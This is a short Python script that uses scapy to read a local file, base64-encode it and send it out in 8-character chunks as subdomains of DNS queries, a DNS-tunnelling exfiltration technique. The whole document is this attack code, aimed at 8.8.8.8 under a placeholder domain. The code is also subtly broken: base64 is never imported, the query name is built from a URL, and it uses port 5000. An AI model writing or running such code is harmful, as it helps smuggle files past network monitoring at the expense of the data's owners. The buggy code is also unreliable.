from scapy.all import DNS, DNSQR, IP, sr1, UDP
import os

url = "http://127.0.0.1/"

def dns_request(sub_domain):
    dns_req = IP(dst='8.8.8.8')/UDP(dport=5000)/DNS(rd=1, qd=DNSQR(qname=f'{sub_domain}.{url}'))
    answer = sr1(dns_req, verbose=0)
    #return answer

dir = os.getcwd()

f = open(f"{dir}\\text.txt", "r")
text = f.read()
text_bytes = base64.b64encode(text.encode("ascii"))
list = [text_bytes[i:i+8] for i in range(0, len(text_bytes), 8)]
for item in list:
    item = item.decode('utf-8')
    if "=" in item:
        item = item.replace("=", "")
    dns_request(item)